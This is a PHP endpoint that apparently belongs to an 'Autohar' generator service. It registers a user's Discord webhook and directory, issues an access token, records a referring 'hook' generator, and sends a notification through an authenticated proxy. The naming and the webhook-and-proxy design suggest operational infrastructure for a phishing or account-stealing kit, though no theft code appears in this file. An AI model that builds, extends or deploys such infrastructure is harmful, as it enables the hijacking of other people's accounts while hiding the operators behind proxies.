<?php
include_once($_SERVER['DOCUMENT_ROOT'] . '/backend/include.php');
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = json_decode(file_get_contents('php://input'), true);

    $webhook = filter_var($data['webhook'], FILTER_SANITIZE_URL);
    if (!$webhook || !filter_var($webhook, FILTER_VALIDATE_URL) ||
        !preg_match('/^https:\/\/(carnary\.)?discord(?:app)?\.com\/api\/webhooks\/\d+\/[\w-]+$/', $webhook)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Invalid webhook.']));
    }

    $name = isset($data['name']) ? filter_var($data['name'], FILTER_SANITIZE_FULL_SPECIAL_CHARS) : null;
    if ($name && !preg_match('/^[A-Za-z0-9]+( [A-Za-z0-9]+)*$/', $name)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Invalid name.']));
    }

    $username = 'New User';
    $user_icon = '/controlPage/files/img/user.png';

    $directory = filter_var($data['directory'], FILTER_SANITIZE_FULL_SPECIAL_CHARS);
    if (!$directory || !preg_match('/^[A-Za-z0-9]{3,20}$/', $directory)) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Directory invalid.']));
    }

    $referer = $_SERVER['HTTP_REFERER'] ?? '';
    $hook = '';
    $is_hooked = false;
    $hook_id = 0;
    $embed_name = $s['app']['embed']['name'];
    $embed_color = $s['app']['embed']['color'];

    $conn = connect();

    if (preg_match('/\/generator\/([^\/]+)\/create$/', $referer, $matches)) {
        $hook = $matches[1];
        $stmt = $conn->prepare("SELECT id, name, color FROM Hooks WHERE directory = ?");
        $stmt->bind_param("s", $hook);
        $stmt->execute();
        $stmt->bind_result($hookId, $hookName, $hookColor);
        if ($stmt->fetch()) {
            $is_hooked = true;
            $hook_id = $hookId;
            $embed_name = $hookName ?? $embed_name;
            $embed_color = $hookColor ?? $embed_color;
        }
        $stmt->close();
    }

    $stmt = $conn->prepare("SELECT webhook, directory FROM Tokens WHERE webhook = ? OR directory = ?");
    $stmt->bind_param("ss", $webhook, $directory);
    $stmt->execute();
    $stmt->bind_result($web, $dir);
    $stmt->fetch();
    $stmt->close();

    if ($web === $webhook) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Webhook already in use.']));
    }

    if ($dir === $directory) {
        http_response_code(400);
        die(json_encode(['success' => false, 'error' => 'Directory taken.']));
    }

    $token = strtoupper(bin2hex(random_bytes(16)));

    $stmt = $conn->prepare("INSERT INTO Tokens (token, name, username, user_icon, directory, webhook, is_hooked, hook_id) VALUES (?, ?, ?, ?, ?, ?, ?, ?)");
    $stmt->bind_param("ssssssii", $token, $name, $username, $user_icon, $directory, $webhook, $is_hooked, $hook_id);
    $stmt->execute();
    $stmt->close();

    setcookie('Token', $token, time() + (30 * 24 * 60 * 60), '/');
    
    $link = short("https://" . $_SERVER['HTTP_HOST'] . "/controlPage/dashboard");

    $payload = [
        "content" => "||@here||",
        "embeds" => [
            [
                "title" => "``$embed_name - New Autohar Generated``",
                "description" => "```$link```
or click [here]($link) to open the dashboard.",
                "color" => hexdec(ltrim($embed_color, '#')),
                "fields" => [
                    [
                        "name" => "Your Token",
                        "value" => "```ansi
[34m$token[0m
```"
                    ]
                ]
            ]
        ],
        "attachments" => []
    ];

	$proxy = proxy();
	$proxy = $proxy[0];
	
    $ch = curl_init($webhook);
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
	curl_setopt($ch, CURLOPT_PROXY, $proxy['ip'] . ':' . $proxy['port']);
    curl_setopt($ch, CURLOPT_PROXYUSERPWD, $proxy['user'] . ':' . $proxy['pass']);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_exec($ch);
    curl_close($ch);

    echo json_encode(['success' => true]);
}